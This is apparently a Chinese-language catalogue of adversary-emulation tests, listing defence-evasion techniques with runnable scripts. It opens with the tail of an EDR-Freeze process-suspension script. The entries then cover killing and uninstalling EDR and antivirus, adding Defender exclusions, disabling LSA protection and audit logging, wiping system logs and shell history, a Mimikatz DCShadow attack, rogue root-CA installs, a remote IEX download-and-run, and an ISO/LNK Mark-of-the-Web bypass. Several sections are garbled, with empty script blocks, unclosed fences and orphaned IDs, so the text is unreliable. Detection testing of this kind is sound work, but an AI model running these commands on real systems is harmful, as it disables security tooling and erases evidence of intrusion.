[System.IO.Compression.ZipFile]::OpenRead($zipPath);             foreach ($entry in $archive.Entries) {;                 if ([string]::IsNullOrWhiteSpace($entry.FullName)) { continue };                 if ($entry.FullName.EndsWith('/')) {;                     $dirPath = Join-Path $extractFolder $entry.FullName;                     if (-not (Test-Path $dirPath)) { New-Item -ItemType Directory -Path $dirPath -Force | Out-Null };                     continue;                 };                 $destPath = Join-Path $extractFolder $entry.FullName;                 $destDir = Split-Path $destPath -Parent;                 if (-not (Test-Path $destDir)) { New-Item -ItemType Directory -Path $destDir -Force | Out-Null };                 if (Test-Path $destPath) { Remove-Item -Path $destPath -Force -ErrorAction SilentlyContinue };                 try {;                     [System.IO.Compression.ZipFileExtensions]::ExtractToFile($entry, $destPath, $false);                 } catch {;                     Write-Host "Failed to extract entry $($entry.FullName): $_" -ForegroundColor Yellow;                 };             };             Write-Host "Extraction completed." -ForegroundColor Green;         } finally {;             if ($archive) { $archive.Dispose() };         };     }; } catch {;     Write-Host "Failed to download or extract EDR-Freeze: $_" -ForegroundColor Red; }; Write-Host "Waiting 15s before putting $processName in the comma" -ForegroundColor Yellow; Start-Sleep -Seconds 5; Write-Host "Waiting 10s before putting $processName in the comma" -ForegroundColor Yellow; Start-Sleep -Seconds 5; Write-Host "Waiting 5s before putting $processName in the comma" -ForegroundColor Yellow; Start-Sleep -Seconds 3; Write-Host "Waiting 2s before putting $processName in the comma" -ForegroundColor Yellow; Start-Sleep -Seconds 2; $edrFreezeExeName = Get-ChildItem -Path $scriptFolder -Filter 'EDR-Freeze_*.exe' -ErrorAction SilentlyContinue |;     Sort-Object LastWriteTime -Descending |;     Select-Object -First 1 -ExpandProperty Name; if (-not $edrFreezeExeName) {;     Write-Host "No EDR-Freeze executable (EDR-Freeze_*.exe) found in $scriptFolder" -ForegroundColor Red;     exit 1; }; $edrFreezeExe = Join-Path $scriptFolder $edrFreezeExeName; Write-Host "Using EDR-Freeze executable: $edrFreezeExeName" -ForegroundColor Cyan; Write-Host "$processName putted in the comma for 15s, by targetting Process ID $($htaProcess.Id)" -ForegroundColor Yellow; Start-Process -FilePath $edrFreezeExe -ArgumentList ("$($process.Id) 15000") | Out-Null
```

#### Kill antimalware protected processes using Backstab
- **ID**: `55fa0d4a61d03d34c0628b6b5343cac7`
- **简介**: Backstab 加载由微软签名的 Process Explorer 驱动程序,并使用它来终止受防恶意软件(如 MsSense.exe 或 MsMpEng.exe)保护的正在运行的进程,这些进程通常无法被终止。https://github.com/Yaxser/Backstab
- **平台/执行器**: windows/psh
- **执行脚本**:
`windows/psh`:
```
& "PathToAtomicsFolder\..\ExternalPayloads\Backstab64.exe" -k -n MsMpEng.exe
```

#### LockBit Black - Disable Privacy Settings Experience Using Registry -cmd
- **ID**: `2d74c884d1e0b55f41542ef64bc8fe4b`
- **简介**: LockBit Black —— 使用注册表禁用隐私设置体验 (Privacy Settings Experience)
- **平台/执行器**: windows/cmd
- **执行脚本**:
`windows/cmd`:
```
reg add "HKCU\Software\Policies\Microsoft\Windows\OOBE" /v DisablePrivacyExperience /t REG_DWORD /d 1 /f
```

#### LockBit Black - Disable Privacy Settings Experience Using Registry -Powershell
- **ID**: `cb6e6c7e18aba2207c696368f8edb23a`

- **平台/执行器**: windows/psh

`windows/psh`:

New-ItemProperty "HKCU:\Software\Policies\Microsoft\Windows\OOBE" -Name DisablePrivacyExperience -PropertyType DWord -Value 1 -Force

```

#### office-365-Disable-AntiPhishRule
- **ID**: `c6d6e157f9ff496abfed129dda16fe13`
- **简介**: 使用 Disable-AntiPhishRule cmdlet 禁用 office-365 组织中的防钓鱼规则。
- **平台/执行器**: unknown/psh
- **执行脚本**:
`unknown/psh`:
```
$secure_pwd = "None" | ConvertTo-SecureString -AsPlainText -Force; $creds = New-Object System.Management.Automation.PSCredential -ArgumentList "None", $secure_pwd; Connect-ExchangeOnline -Credential $creds; $test = Get-AntiPhishRule; Disable-AntiPhishRule -Identity $test.Name -Confirm:$false; Get-AntiPhishRule

#### Reboot Linux Host via Kernel System Request

#### Remove Windows Defender Definition Files
- **ID**: `197a322f46033d8c1e5011967a0bce41`
- **简介**: 删除定义文件将导致 ATP 无法针对反恶意软件触发。请查看 MpCmdRun.exe 手册页以了解所有参数的信息。在较新版本的 Windows(1909+)上,即使以管理员身份运行,此命令也会因权限不足而失败。在较旧版本的 Windows 上,该命令将显示"已完成"。https://unit42.paloaltonetworks.com/unit42-gorgon-group-slithering-nation-state-cybercrime/
- **平台/执行器**: windows/cmd
- **执行脚本**:
`windows/cmd`:
```
"C:\Program Files\Windows Defender\MpCmdRun.exe" -RemoveDefinitions -All
```

#### Stop and Remove Arbitrary Security Windows Service
- **ID**: `f5b48f9f8e01db3edd487c05580a0e90`
- **简介**: 从 Powershell 6.0 开始,Stop-Service cmdlet 会向每个指定的服务发送停止消息到 Windows 服务控制管理器。Remove-Service cmdlet 会在注册表和服务数据库中删除 Windows 服务。
- **平台/执行器**: windows/psh
- **执行脚本**:
`windows/psh`:
```
Stop-Service -Name McAfeeDLPAgentService; Remove-Service -Name McAfeeDLPAgentService
```

#### Tamper with Defender ATP on Linux/MacOS
- **ID**: `e1f65b54abdec1c5c6f9411b31a4ed01`
- **简介**: 拥有 root 权限时,攻击者可以禁用实时保护。请注意,此测试假设 Defender 未处于被动模式,且实时保护已启用。在 Linux 上使用 managed.json 或在 MacOS 上使用 Defender .plist 将阻止这些更改。防篡改保护 (Tamper Protection) 也将阻止此操作(在 MacOS 上可用,但在撰写本文时 Linux 上不可用)。安装 MDATP 是前置条件。安装步骤因 MacOS 和 Linux 发行版而异。请参阅微软公开文档获取说明: https://learn.microsoft.com/en-us/microsoft-365/security/defender-endpoint/mac-install-manually?view=o365-worldwide https://learn.microsoft.com/en-us/microsoft-365/security/defender-endpoint/linux-install-manually?view=o365-worldwide
- **平台/执行器**: darwin/sh, linux/sh
- **执行脚本**:
`linux/sh`:
```
sudo mdatp config real-time-protection --value disabled
```

#### Tamper with Windows Defender Command Prompt
- **ID**: `29b7a018dce0877b3d2292286a0f512f`
- **简介**: 尝试禁用 Windows Defender ATP 的计划扫描及其他部分。这些命令必须以 System 身份运行,因此即使以管理员身份运行也仍会失败。不过,攻击者确实会尝试执行此操作,因此监视这些命令行有助于针对其他正在发生的不良活动发出告警。执行后,将显示两次"Access Denied",并显示 WinDefend 服务状态。
- **平台/执行器**: windows/cmd
- **执行脚本**:
`windows/cmd`:
```
sc stop WinDefend && sc config WinDefend start=disabled && sc query WinDefend
```

#### Tamper with Windows Defender Evade Scanning -Extension
- **ID**: `e0946bc3b8b888d6c4cdf3f023fe3c0b`
- **简介**: 恶意软件可以将特定扩展名排除在扫描之外,从而逃避检测。成功执行后,该扩展名应出现在排除扩展名列表中。可使用 powershell (Get-MpPreference).ExclusionExtension 检查排除列表。
- **平台/执行器**: windows/psh
- **执行脚本**:
`windows/psh`:
```
$excludedExts= ".exe"; Add-MpPreference -ExclusionExtension  $excludedExts
```

#### Tamper with Windows Defender Evade Scanning -Folder
- **ID**: `5c4ea84c2b050f1f8b6f880755ccbc62`
- **简介**: 恶意软件可以将特定路径排除在扫描之外,从而逃避检测。成功执行后,所提供的文件应出现在排除路径列表中。可使用 powershell (Get-MpPreference).ExclusionPath 检查排除列表。
- **平台/执行器**: windows/psh
- **执行脚本**:
`windows/psh`:
```
$excludedpath= "C:\Temp"; Add-MpPreference -ExclusionPath $excludedpath
```

#### Tamper with Windows Defender Evade Scanning -Process
- **ID**: `c407315583b3a00d9a2e0c3c510f2c96`
- **简介**: 恶意软件可以将特定进程排除在扫描之外,从而逃避检测。成功执行后,该进程应出现在排除进程列表中。可使用 powershell (Get-MpPreference).ExclusionProcess 检查排除列表。
- **平台/执行器**: windows/psh
- **执行脚本**:
`windows/psh`:
```
$excludedProcess = "outlook.exe"; Add-MpPreference -ExclusionProcess $excludedProcess
```

#### Tamper with Windows Defender Registry
- **ID**: `43e3334362b140924f001b256b229ee5`
- **简介**: 禁用 Windows Defender 在重启后启动。执行后,如果计算机重启,设置中的整个 Virus and Threat Protection(病毒和威胁防护)窗口将呈灰色显示,且不包含任何信息。
- **平台/执行器**: windows/psh
- **执行脚本**:
`windows/psh`:
```
Set-ItemProperty "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name DisableAntiSpyware -Value 1
```

#### Throttle Cybersecurity Agent Network Traffic via QoS Policy
- **ID**: `d1383c55fe5c6f92a74f48faf6329db6`
- **简介**: 此测试模拟攻击者通过对安全代理进程应用基于策略的服务质量（QoS）限流规则来削弱安全代理能力。 与传统的规避技术（如基于防火墙的阻止或进程终止）不同，此方法利用 Windows 原生功能来降级（而非禁用）防御性工具： - 使用 Windows 内置 QoS 功能操纵应用程序带宽 - 将网络吞吐量限制到极低水平（例如每秒 8 比特） - 导致安全代理在尝试与其云端后端通信时反复超时 结果是，遥测数据摄取、告警和远程响应能力可能会被显著降级，而代理本身仍继续运行并看似正常。 此技术受 Zero Salarium 及相关 EDRChoker 工具（https://www.zerosalarium.com/2026/06/edrchoker-choking-telemetry-stream-block-edr.html）的研究启发，该研究展示了攻击者如何利用现代 EDR 解决方案对持续、低延迟云连接的依赖，在不触发传统篡改检测的情况下制造暂时的可见性缺失。
- **平台/执行器**: windows/psh
- **执行脚本**:
`windows/psh`:
```
New-NetQosPolicy -Name "CyberSecurityAgentThrottlingTest" `;   -AppPathNameMatchCondition "MsSense.exe" `;   -ThrottleRateActionBitsPerSecond 8 `;   -PolicyStore ActiveStore
```

#### Uninstall Crowdstrike Falcon on Windows
- **ID**: `2e9acde621e7768a73c1b9a1157c444d`
- **简介**: 卸载 Crowdstrike Falcon。如果未将 WindowsSensor.exe 路径作为参数提供，则需要搜索它。由于该可执行文件位于以随机 GUID 命名的文件夹中，因此需要在调用卸载程序之前识别该文件夹。
- **平台/执行器**: windows/psh
- **执行脚本**:
`windows/psh`:
```
if (Test-Path "C:\ProgramData\Package Cache\{7489ba93-b668-447f-8401-7e57a6fe538d}\WindowsSensor.exe") {. "C:\ProgramData\Package Cache\{7489ba93-b668-447f-8401-7e57a6fe538d}\WindowsSensor.exe" /repair /uninstall /quiet } else { Get-ChildItem -Path "C:\ProgramData\Package Cache" -Include "WindowsSensor.exe" -Recurse | % { $sig=$(Get-AuthenticodeSignature -FilePath $_.FullName); if ($sig.Status -eq "Valid" -and $sig.SignerCertificate.DnsNameList -eq "CrowdStrike, Inc.") { . "$_" /repair /uninstall /quiet; break;}}}
```

#### Windows Disable LSA Protection
- **ID**: `c7ec84be7b5a6e587c6a227da1e7b6c7`
- **简介**: 以下 Atomic 测试添加一个注册表项以禁用 LSA Protection。LSA 在内存中控制和管理用户权限信息、密码哈希以及其他重要的信息片段。攻击者工具（如 mimikatz）依赖访问这些内容来抓取密码哈希或明文密码。启用 LSA Protection 可配置 Windows 以更安全的方式控制存储在内存中的信息——具体而言，防止非受保护进程访问这些数据。成功执行后，注册表将被修改，RunAsPPL 将被设置为 0，从而禁用 Lsass 保护。https://learn.microsoft.com/en-us/windows-server/security/credentials-protection-and-management/configuring-additional-lsa-protection#how-to-disable-lsa-protection https://blog.netwrix.com/2022/01/11/understanding-lsa-protection/ https://thedfirreport.com/2022/03/21/phosphorus-automates-initial-access-using-proxyshell/
- **平台/执行器**: windows/cmd
- **执行脚本**:
`windows/cmd`:
```
reg add HKLM\SYSTEM\CurrentControlSet\Control\LSA /v RunAsPPL /t REG_DWORD /d 0 /f
```

### Disable or Modify Tools: Clear Linux or Mac System Logs（T1685.006） — 20 个

#### Delete log files using built-in log utility
- **ID**: `c70576fa7f5bde9433494d480a215236`
- **简介**: 此测试删除主日志数据存储、传输中的日志数据、生存时间（TTL）数据、故障和错误内容。
- **平台/执行器**: darwin/sh
- **执行脚本**:
`darwin/sh`:
```
sudo log erase --all; sudo log erase --ttl
```

#### Delete log files via cat utility by appending /dev/null or /dev/zero
- **ID**: `d1339b698f76726530d80eb0017ef759`
- **简介**: 第一个子测试通过 /dev/null 将日志文件截断为零字节，第二个子测试通过 /dev/zero 使用 cat 工具用空字节（零）填充日志文件。
- **平台/执行器**: darwin/sh
- **执行脚本**:
`darwin/sh`:
```
sudo cat /dev/null > /var/log/system.log; sudo dd if=/dev/zero bs=1000 count=5 of=/var/log/system.log
```

#### Delete log files via cat utility by appending /dev/null or /dev/zero (freebsd)
- **ID**: `32e710214d470b283654765d034c1efe`
- **简介**: 第一个子测试通过 /dev/null 将日志文件截断为零字节，第二个子测试通过 /dev/zero 使用 cat 工具用空字节（零）填充日志文件。
- **平台/执行器**: linux/sh
- **执行脚本**:
`linux/sh`:
```
cat /dev/null > /var/log/messages; cat /dev/zero > /var/log/messages
```

#### Delete system journal logs via rm and journalctl utilities
- **ID**: `4a2dd0eceebc5e00fbcefce0f03bf004`
- **简介**: 第一个子测试在 "/var/log/journal/" 目录中使用 rm 工具删除 journal 文件，第二个子测试通过将应保留日志的时间期限修改为零来清空 journal。
- **平台/执行器**: linux/sh
- **执行脚本**:
`linux/sh`:
```
sudo rm /var/log/journal/*; sudo journalctl --vacuum-time=0
```

#### Delete system log files using Applescript
- **ID**: `5fd5381c2240b1844973d8dfc1034584`
- **简介**: 此测试通过 Finder 应用程序使用 osascript（AppleScript）删除系统日志文件。注意：作为 TCC（透明度、同意与控制）框架的一部分，在命令成功执行之前，系统可能会提示用户授予对 Finder 应用程序的访问权限。参考：https://www.rainforestqa.com/blog/macos-tcc-db-deep-dive
- **平台/执行器**: darwin/sh
- **执行脚本**:
`darwin/sh`:
```
osascript -e 'tell application "Finder" to delete POSIX file "/var/log/system.log"'
```

#### Delete system log files using OSAScript

- **平台/执行器**: darwin/sh
- **执行脚本**:
`darwin/sh`:

```

#### System log file deletion via find utility
- **ID**: `553350f9a56547d9958e84ffecdcacc9`

```

- **ID**: `c9d392b7f499b974aef4e93c8d96a88c`
- **简介**: 使用 'auditctl -D' 会删除所有现有审计规则，导致先前配置的监控设置和审计跟踪（audit trail）丢失。此操作降低了对系统活动的可见性，可能引发合规性问题并妨碍安全监控工作。此外，它通过抹除审计日志中的证据，存在掩盖未授权活动的风险。

`linux/sh`:
```
if [ $(command -v auditctl) ]; then : ; else (yum install auditd -y) || (apt-get install auditd -y) || (dnf install auditd -y); fi;  auditctl -D
```

#### Disable auditd using auditctl
- **ID**: `8dcbd96c363f960bd864ef6554658f27`
- **简介**: 命令 `auditctl -e 0` 会禁用审计系统。通过将参数设置为 `0`，审计被停用，从而停止对安全相关事件的监控和记录。此操作停止生成审计日志，停止收集有关系统活动的数据。禁用审计可能出于多种原因，例如故障排除、性能优化或暂时中止审计要求，但它降低了对系统事件的可见性，并可能影响安全监控和合规工作。
- **平台/执行器**: linux/sh
- **执行脚本**:
`linux/sh`:
```
if [ $(command -v auditctl) ]; then : ; else (yum install auditd -y) || (apt-get install auditd -y) || (dnf install auditd -y); fi;  auditctl -e 0
```

### Prevent Command History Logging（T1690） — 11 个

#### Clear bash history
- **ID**: `3f465c72d351789eda3a553334fa43f3`
- **简介**: 攻击者可能在注销前的最后一步清除 bash 历史缓存和历史文件，以删除其命令行活动的记录。在此测试中，我们全程使用 $HISTFILE 变量：1. 确认 $HISTFILE 变量已设置；2. 向其 echo ""；3..5 确认文件为空；6. 清除历史缓存；7. 确认历史缓存为空。这正是攻击者将要注销的时刻。
- **平台/执行器**: linux/sh
- **执行脚本**:
`linux/sh`:
```
cp $HISTFILE $HISTFILE.OLD; if ((${#HISTFILE[@]})); then echo $HISTFILE; fi; echo "" > $HISTFILE; if [ $(wc -c <$HISTFILE) -gt 1 ]; then echo "$HISTFILE is larger than 1k"; fi; ls -la $HISTFILE ; cat $HISTFILE; history -c ; if [ $(history |wc -l) -eq 1 ]; then echo "History cache cleared"; fi
```

#### Disable history collection
- **ID**: `b3f5118a34b5aa8eee17a0344e815b77`
- **简介**: 在 Shell 中禁用历史记录收集。
- **平台/执行器**: darwin/sh, linux/sh
- **执行脚本**:
`linux/sh`:
```
export HISTCONTROL=ignoreboth; whoami
```

#### Disable history collection (freebsd)
- **ID**: `a3e530b92fe6e08b2ec2e817bf3833af`
- **简介**: 在 Shell 中禁用历史记录收集。
- **平台/执行器**: linux/sh
- **执行脚本**:
`linux/sh`:
```

```

#### Disable Windows Command Line Auditing using Powershell Cmdlet
- **ID**: `de100059ead28b14ee2f1748c1a02982`
- **简介**: 在 Windows 操作系统中，命令行审核通过以下注册表值进行控制：注册表路径：HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\Audit；注册表值：ProcessCreationIncludeCmdLine_Enabled。启用命令行审核后，系统会记录有关命令执行的详细信息，包括所执行的命令、负责执行命令的用户帐户以及执行的时间戳。这些信息对于安全监控和取证分析至关重要，可帮助组织检测和调查系统中的未授权或恶意活动。默认情况下，Windows 系统可能未启用命令行审核，管理员必须手动配置相应的注册表设置以将其激活。反之，攻击者可能会尝试篡改这些注册表项以禁用命令行审核，作为其规避检测、掩盖恶意活动踪迹的手段之一。由于此攻击会运行一个 PowerShell cmdlet，因此可以通过监控以下两项来检测此类攻击：PowerShell 日志记录（Windows PowerShell 事件 ID 400、800、4103、4104）；注册表事件（Windows 事件 ID 4657、Sysmon 事件 ID 13）。在此了解更多：https://securitydatasets.com/notebooks/atomic/windows/defense_evasion/SDWIN-220703123711.html https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.management/new-itemproperty?view=powershell-7.4#example-2-add-a-registry-entry-to-a-key
- **平台/执行器**: windows/psh
- **执行脚本**:
`windows/psh`:
```
New-ItemProperty -Path "HKLM:Software\Microsoft\Windows\CurrentVersion\Policies\System\Audit" -Name "ProcessCreationIncludeCmdLine_Enabled" -Value 0 -PropertyType DWORD -Force -ErrorAction Ignore
```

#### Disable Windows Command Line Auditing using reg.exe
- **ID**: `a459e6e38281b098cf459358c279c5e0`
- **简介**: 在 Windows 操作系统中，命令行审核通过以下注册表值进行控制：注册表路径：HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\Audit；注册表值：ProcessCreationIncludeCmdLine_Enabled。启用命令行审核后，系统会记录有关命令执行的详细信息，包括所执行的命令、负责执行命令的用户帐户以及执行的时间戳。这些信息对于安全监控和取证分析至关重要，可帮助组织检测和调查系统中的未授权或恶意活动。默认情况下，Windows 系统可能未启用命令行审核，管理员必须手动配置相应的注册表设置以将其激活。反之，攻击者可能会尝试篡改这些注册表项以禁用命令行审核，作为其规避检测、掩盖恶意活动踪迹的手段之一。由于此攻击通过命令提示符执行 reg.exe，因此可以通过监控以下两项来检测此类攻击：reg.exe 的进程创建事件（Windows 事件 ID 4688、Sysmon 事件 ID 1）；注册表事件（Windows 事件 ID 4657、Sysmon 事件 ID 13）。在此了解更多：https://securitydatasets.com/notebooks/atomic/windows/defense_evasion/SDWIN-220703123711.html
- **平台/执行器**: windows/cmd
- **执行脚本**:

```

#### Setting the HISTCONTROL environment variable
- **ID**: `61263734b9e2b9bd88c7b57b8cd9fe87`
- **简介**: 攻击者可能利用命令前的空格（例如 " ls"）或 Bash 历史记录中的重复命令抑制功能，来防止其命令被记录到历史文件中，或掩盖所用命令的顺序。在此测试中，我们：1. 将 $HISTCONTROL 设置为 ignoreboth；2. 清除历史缓存；3. 在 ls -la 前加一个空格后执行；4. 确认 ls -la 不在历史缓存中；5. 将 $HISTCONTROL 设置为 erasedups；6. 清除历史缓存；7..9 执行 ls -la $HISTFILE 3 次；10. 确认历史记录中只有一条命令。
- **平台/执行器**: linux/sh
- **执行脚本**:
`linux/sh`:
```
TEST=$(echo $HISTCONTROL); if [ "$HISTCONTROL" != "ignoreboth" ]; then export HISTCONTROL="ignoreboth"; fi; history -c ; ls -la $HISTFILE; if [ $(history |wc -l) -eq 1 ]; then echo "ls -la is not in history cache"; fi; if [ "$HISTCONTROL" != "erasedups" ]; then export HISTCONTROL="erasedups"; fi; history -c ; ls -la $HISTFILE; ls -la $HISTFILE; ls -la $HISTFILE; if [ $(history |wc -l) -eq 2 ]; then echo "Their is only one entry for ls -la $HISTFILE"; fi
```

#### Setting the HISTFILE environment variable
- **ID**: `b2e76a3113cbfc8e9729b7e170a5a6aa`
- **简介**: 攻击者可以清除、取消设置或重定向历史环境变量 HISTFILE，以防止在退出系统后将命令记录到历史文件中。注意：我们不希望退出登录，因此只确认 HISTFILE 的值。在本测试中，我们 1. echo HISTFILE 2. 将其设置为 /dev/null 3. 确认 HISTFILE 被设置为 /dev/null。
- **平台/执行器**: linux/sh
- **执行脚本**:
`linux/sh`:
```
TEST=$(echo $HISTFILE); echo $HISTFILE; export HISTFILE="/dev/null"; echo "runnning some commands to populate the history"; whoami; groups; if [ $(echo $HISTFILE) == "/dev/null" ]; then echo "\$HISTFILE is /dev/null"; else HIST_LENGHT=$(wc -l $HISTFILE); echo "\$HISTFILE is not /dev/null, history lenght is $HIST_LENGHT";  fi
```

#### Setting the HISTFILESIZE environment variable
- **ID**: `6c7a3ee5d1a6444b0876af11f0c7e665`
- **简介**: 攻击者可以将 bash 历史文件大小环境变量（HISTFILESIZE）设置为零，以防止在退出系统后将命令记录到历史文件中。注意：我们不希望退出登录，因此只确认 HISTFILESIZE 的值。在本测试中，我们 1. echo HISTFILESIZE 2. 将其设置为零 3. 确认 HISTFILESIZE 被设置为零。
- **平台/执行器**: linux/sh
- **执行脚本**:
`linux/sh`:
```
TEST=$(echo $HISTFILESIZE); echo $HISTFILESIZE; export HISTFILESIZE=0; echo "runnning some commands to populate the history"; whoami; groups; if [ $(echo $HISTFILESIZE) -eq 0 ]; then echo "\$HISTFILESIZE is zero"; else HIST_LENGHT=$(wc -l $HISTFILE); echo "\$HISTFILESIZE is not zero, history lenght is $HIST_LENGHT";  fi
```

#### Setting the HISTIGNORE environment variable
- **ID**: `7282b390720ee1987054af6dd212d0f2`
- **简介**: 攻击者可以利用 HISTIGNORE 环境变量来忽略特定命令或所有命令。在本测试中，我们 1. 设置 HISTIGNORE 以忽略 ls、rm 和 ssh 命令 2. 清除此历史缓存 3..4 执行 ls 命令 5. 确认 ls 命令不在历史缓存中 6. 取消设置 HISTIGNORE 变量 7.. 再次执行相同操作，但忽略所有命令。
- **平台/执行器**: linux/sh
- **执行脚本**:
`linux/sh`:
```
if ((${#HISTIGNORE[@]})); then echo "\$HISTIGNORE = $HISTIGNORE"; else export HISTIGNORE='ls*:rm*:ssh*'; echo "\$HISTIGNORE = $HISTIGNORE"; fi; history -c ; ls -la $HISTFILE; ls -la ~/.bash_logout; if [ $(history |wc -l) -eq 1 ]; then echo "ls commands are not in history"; fi; unset HISTIGNORE; if ((${#HISTIGNORE[@]})); then echo "\$HISTIGNORE = $HISTIGNORE"; else export HISTIGNORE='*'; echo "\$HISTIGNORE = $HISTIGNORE"; fi; history -c ; whoami; groups; if [ $(history |wc -l) -eq 0 ]; then echo "History cache is empty"; fi
```

#### Setting the HISTSIZE environment variable
- **ID**: `4b0de71ecc4051c47797ca02ae3204bc`
- **简介**: 攻击者可以将 sh 历史文件大小环境变量（HISTSIZE）设置为零，以防止在退出系统后将命令记录到历史文件中。注意：我们不希望退出登录，因此只确认 HISTSIZE 的值。在本测试中，我们 1. echo HISTSIZE 2. 将其设置为零 3. 确认 HISTSIZE 被设置为零。
- **平台/执行器**: linux/sh
- **执行脚本**:
`linux/sh`:
```
echo $HISTSIZE; export HISTSIZE=0; echo "runnning some commands to populate the history"; whoami; groups; if [ $(echo $HISTSIZE) -eq 0 ]; then echo "\$HISTSIZE is zero"; else HIST_LENGTH=$(wc -l $HISTFILE); echo "\$HISTSIZE is not zero, history size is $HIST_LENGTH";  fi
```

### Rogue Domain Controller（T1207） — 1 个

#### DCShadow (Active Directory)
- **ID**: `acd37a62e589a7190c35101583939337`
- **简介**: 使用 Mimikatz DCShadow 方法模拟 Active Directory 域控制器的行为并编辑受保护的属性。[DCShadow](https://www.dcshadow.com/) [Additional Reference](http://www.labofapenetrationtester.com/2018/04/dcshadow.html) 它会将目标用户（用户/计算机账户）的 badPwdCount 属性设置为 9999。之后你可以通过以下命令检查：Get-ADObject -LDAPFilter '(samaccountname=<user>)' -Properties badpwdcount | select-object -ExpandProperty badpwdcount 本地需要 SYSTEM 权限（可通过 PsExec 自动获取，因此以管理员身份运行即可），远程需要域管理员权限。最简单的方式是以提升权限的域管理员用户身份运行。
- **平台/执行器**: windows/psh
- **执行脚本**:
`windows/psh`:
```
$dc_output_file = "PathToAtomicsFolder\..\ExternalPayloads\art-T1207-mimikatz-DC.log"; Remove-Item $dc_output_file -ErrorAction Ignore; $mimikatzParam ="`"log $dc_output_file`" `"lsadump::dcshadow /object:#{object} /attribute:#{attribute} /value:#{value}`" `"exit`""; $dc = Start-Process -FilePath cmd.exe -Verb Runas -ArgumentList "/c '#{psexec_path}' /accepteula -d -s #{mimikatz_path} $mimikatzParam"; Start-Sleep -Seconds 5; & "#{mimikatz_path}" "lsadump::dcshadow /push" "exit"; Write-Host "`nWaiting for fake DC server to return"; Wait-Process $dc; Write-Host "`nOutput from fake DC server:"; Get-Content $dc_output_file; Start-Sleep 1; Remove-Item $dc_output_file -ErrorAction Ignore; Write-Host "End of DCShadow"
```

### Subvert Trust Controls: Install Root Certificate（T1553.004） — 7 个

#### Add Root Certificate to CurrentUser Certificate Store
- **ID**: `9d21f3b551b40fa40056af1244af56ee`
- **简介**: 以下 Atomic 测试模拟向 CurrentUser 证书存储添加一个普通的非恶意证书。此行为会生成注册表修改，在博客中概述的键中添加克隆的根 CA 证书。键将类似于 - \SystemCertificates\CA\Certificates 或 \SystemCertificates\Root\Certificates 参考：https://posts.specterops.io/code-signing-certificate-cloning-attacks-and-defenses-6f98657fc6ec
- **平台/执行器**: windows/psh
- **执行脚本**:
`windows/psh`:
```
IEX (IWR 'https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1553.004/src/RemoteCertTrust.ps1' -UseBasicParsing)
```

#### Install root CA on CentOS/RHEL
- **ID**: `ddc68247897068b0e9afb5e1ecd254d1`
- **简介**: 使用 openssl 创建根 CA
- **平台/执行器**: linux/sh
- **执行脚本**:
`linux/sh`:
```
openssl genrsa -out rootCA.key 4096; openssl req -x509 -new -nodes -key rootCA.key -sha256 -days 365 -subj "/C=US/ST=Denial/L=Springfield/O=Dis/CN=www.example.com" -out rootCA.crt; cp rootCA.crt /etc/pki/ca-trust/source/anchors/; update-ca-trust
```

#### Install root CA on Debian/Ubuntu
- **ID**: `7848a2c077be7619045cbe9e90c79d0e`
- **简介**: 使用 openssl 创建根 CA
- **平台/执行器**: linux/sh
- **执行脚本**:
`linux/sh`:
```
if [ -f rootCA.crt ]; then : ; else if [ ! -f rootCA.key ]; then openssl genrsa -out rootCA.key 4096; fi; openssl req -x509 -new -nodes -key rootCA.key -sha256 -days 365 -subj "/C=US/ST=Denial/L=Springfield/O=Dis/CN=www.example.com" -out rootCA.crt; fi;  mv rootCA.crt /usr/local/share/ca-certificates; sudo update-ca-certificates
```

#### Install root CA on FreeBSD
- **ID**: `9399ad5b8b179e188880c74f84c8d76b`
- **简介**: 使用 openssl 创建根 CA
- **平台/执行器**: linux/sh
- **执行脚本**:
`linux/sh`:
```
openssl genrsa -out rootCA.key 4096; openssl req -x509 -new -nodes -key rootCA.key -sha256 -days 365 -subj "/C=US/ST=Denial/L=Springfield/O=Dis/CN=www.example.com" -out rootCA.crt; cp rootCA.crt /usr/local/share/certs/; certctl rehash
```

#### Install root CA on macOS
- **ID**: `347554800d9fecf541670235a8ec31d9`
- **简介**: 使用 openssl 创建根 CA
- **平台/执行器**: darwin/sh
- **执行脚本**:
`darwin/sh`:
```
if [ -f rootCA.crt ]; then : ; else if [ ! -f rootCA.key ]; then openssl genrsa -out rootCA.key 4096; fi; openssl req -x509 -new -nodes -key rootCA.key -sha256 -days 365 -subj "/C=US/ST=Denial/L=Springfield/O=Dis/CN=www.example.com" -out rootCA.crt; fi;  sudo security add-trusted-cert -d -r trustRoot -k "/Library/Keychains/System.keychain" "rootCA.crt"

#### Install root CA on Windows
- **ID**: `51ddafefb92c9dfcb6ce3369e7316bf3`
- **简介**: 使用 Powershell 创建根 CA
- **平台/执行器**: windows/psh
- **执行脚本**:
`windows/psh`:
```
$cert = Import-Certificate -FilePath rootCA.cer -CertStoreLocation Cert:\LocalMachine\My; Move-Item -Path $cert.PSPath -Destination "Cert:\LocalMachine\Root"
```

### Subvert Trust Controls: Mark-of-the-Web Bypass（T1553.005） — 4 个

#### Execute LNK file from ISO
- **ID**: `d2e0c0165046372fcd5e2bf910eeb477`
- **简介**: 从 AllTheThings.iso 执行 LNK 文件 document.lnk。该链接文件执行 cmd.exe 和 rundll32，以加载并执行 ISO 中的 AllTheThingsx64.dll，从而生成 calc.exe。
- **平台/执行器**: windows/psh
- **依赖 payload**: 053c10_AllTheThings.iso
- **执行脚本**:
`windows/psh`:
```
Mount-DiskImage -ImagePath "053c10_AllTheThings.iso" -StorageType ISO -Access ReadOnly; $keep = Get-Volume -FileSystemLabel "AllTheThings"; $driveLetter = ($keep | Get-Volume).DriveLetter; $instance = [activator]::CreateInstance([type]::GetTypeFromCLSID("{c08afd90-f2a1-11d1-8455-00a0c91f3880}")); $instance.Document.Application.ShellExecute($driveLetter+":\document.lnk","",$driveLetter+":\",$null,0)
```

#### Mount an ISO image and run executable from the ISO
- **ID**: `46e85e8a9297cb58b7001e2f9267b6f9`
